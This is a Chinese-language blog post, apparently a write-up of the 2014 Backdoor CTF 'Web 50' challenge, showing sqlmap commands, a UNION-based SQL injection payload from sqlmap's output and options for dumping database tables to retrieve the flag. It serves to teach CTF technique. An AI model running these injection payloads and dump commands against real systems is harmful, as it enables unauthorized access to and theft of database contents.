---
layout: post
title: "Blackdoor CTF Web 50"
date: 2014-03-25 23:11:59 +0800
comments: true
categories: 
- blackdoor 2014
- CTF
- Web 
---

SQL injection 基礎題，下收 sqlmap 基本用法。

<!-- more -->

題目:

![2014 blackdoor CTF web 10 question](/images/2014-03-25-backdoor-web-50/web-50-question-0.PNG)
![2014 blackdoor CTF web 10 question](/images/2014-03-25-backdoor-web-50/web-50-question.PNG)


是個搜尋介面，隨便打個字串...

![2014 blackdoor CTF web 10 question](/images/2014-03-25-backdoor-web-50/web-50-answer-0.PNG)


看起來像是 SQL injection，多 try 幾次:

![2014 blackdoor CTF web 10 question](/images/2014-03-25-backdoor-web-50/web-50-answer-1.PNG)


Hmm, 說來慚愧，其實我 sql injection 直接硬打實在不是很熟，直接上 sqlmap

    sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php \
           --data='search="12"'

sqlmap 的基本用法:

     -u : 指定 target URL
     --data: 指定可以 injection 的參數

成功的話會吐出如何 injection 的 payload

    sqlmap identified the following injection points with a total of 0 HTTP(s) 
    requests:
    ---
    Place: POST
    Parameter: search
    Type: UNION query
    Title: MySQL UNION query (NULL) - 1 to 10 columns
    Payload: search=a') UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,118,119,122,58)
        ,CHAR(89,118,81,114,79,117,87,111,120,104),CHAR(58,105,115,101,58))# AND ('
        IqLA'='IqLA
    ---

接下來 dump DB, table, 各種隨意

    --dbs:   列出這台機器上有跑的資料庫
    --table: 列出這個資料庫裡面的 tables
    -D:      指定現在要使用的資料庫
    -T:      指定現在要使用的 table
    --dump:  取得裡面的資料

用 --dbs & --table 找出 flag 藏身之處，再 dump 出來:

     sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php \
            --data='search="12"' \
            -D sqli_db \
            -T the_flag_is_over_here \
            --dump

大概就是這樣囉。
